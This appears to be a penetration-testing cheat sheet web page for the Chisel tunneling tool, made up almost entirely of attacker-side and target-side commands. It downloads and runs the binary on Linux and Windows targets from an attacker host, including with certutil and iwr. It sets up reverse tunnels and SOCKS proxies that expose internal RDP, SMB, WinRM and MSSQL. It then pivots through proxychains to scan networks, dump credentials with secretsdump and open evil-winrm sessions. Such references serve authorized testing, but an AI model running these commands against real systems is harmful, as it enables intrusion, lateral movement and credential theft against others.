title: Chisel Tunneling
html:
Chisel Tunneling

Fast TCP/UDP tunnel transported over HTTP and secured via SSH. Used for port forwarding and SOCKS5 reverse proxies through firewalls.

Installation / Download

# Download latest release (Linux amd64)
curl -sLo /tmp/chisel.gz https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gzip -d /tmp/chisel.gz && chmod +x /tmp/chisel

# Or build from source
go install github.com/jpillora/chisel@latest

# Transfer to target (from attacker)
python3 -m http.server 8000
# On target:
wget http://<lhost>:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel
curl -o /tmp/chisel http://<lhost>:8000/chisel && chmod +x /tmp/chisel

Server Setup (Attacker)

# Basic reverse tunnel server
chisel server -p <lport> --reverse

# With authentication
chisel server -p <lport> --reverse --auth <username>:<password>

# SOCKS5 reverse proxy server
chisel server -p <lport> --reverse --socks5

# Verbose output
chisel server -p <lport> --reverse -v

Client Connect (Target)

# Basic reverse port forward: expose target port to attacker
# Forwards target localhost:<port> to attacker:<lport>
chisel client <lhost>:<lport> R:<lport>:127.0.0.1:<port>

# Example: expose internal RDP (3389) on attacker port 13389
chisel client <lhost>:8080 R:13389:127.0.0.1:3389

# With auth
chisel client --auth <username>:<password> <lhost>:<lport> R:<lport>:127.0.0.1:<port>

# Verbose
chisel client <lhost>:<lport> R:<lport>:127.0.0.1:<port> -v

SOCKS5 Reverse Proxy

# Attacker: start SOCKS5 server
chisel server -p <lport> --reverse --socks5

# Target: connect and create SOCKS tunnel
chisel client <lhost>:<lport> R:<socks-port>:socks

# Now use the SOCKS proxy on attacker at 127.0.0.1:<socks-port>
# Add to /etc/proxychains4.conf:
# socks5  127.0.0.1 <socks-port>

# Default SOCKS port example (1080)
chisel client <lhost>:8080 R:1080:socks

Port Forward Examples

# Forward multiple ports in one command
chisel client <lhost>:<lport> R:8888:127.0.0.1:8080 R:4444:127.0.0.1:445

# Local forward: reach remote network through target
# (attacker connects to attacker:9090 -> target connects to <ip>:<port>)
chisel client <lhost>:<lport> 9090:<ip>:<port>

# SMB relay setup: expose target SMB
chisel client <lhost>:8080 R:445:127.0.0.1:445

# WinRM forward
chisel client <lhost>:8080 R:5985:127.0.0.1:5985

# MSSQL forward
chisel client <lhost>:8080 R:1433:127.0.0.1:1433

Common Usage Through Proxychains

# After setting up SOCKS5 reverse proxy, use proxychains
# /etc/proxychains4.conf: socks5 127.0.0.1 1080

# Scan internal network through tunnel
proxychains nmap -sT -Pn -n <ip>
proxychains nmap -sT -Pn -n --top-ports 1000 10.10.10.0/24

# Reach internal web app
proxychains curl http://<ip>:<port>/
proxychains firefox http://<ip>

# Run impacket tools through tunnel
proxychains secretsdump.py <domain>/<username>:<password>@<ip>
proxychains evil-winrm -i <ip> -u <username> -p <password>

# SSH through SOCKS
proxychains ssh <username>@<ip>

# Disable DNS lookup for proxychains (faster)
# proxy_dns line in proxychains.conf — comment it out
proxychains -q nmap -sT -Pn -n <ip>

Windows Target

# Download and run on Windows target (PowerShell)
iwr http://<lhost>:8000/chisel.exe -o C:\Windows\Temp\chisel.exe
C:\Windows\Temp\chisel.exe client <lhost>:<lport> R:<socks-port>:socks

# Via cmd
certutil -urlcache -f http://<lhost>:8000/chisel.exe C:\Windows\Temp\chisel.exe
C:\Windows\Temp\chisel.exe client <lhost>:<lport> R:1080:socks
excerpt: Chisel fast TCP/UDP tunnel over HTTP with SSH security. Port forwarding and SOCKS5 reverse proxy through firewalls. Server setup, client connect, proxychains usage.
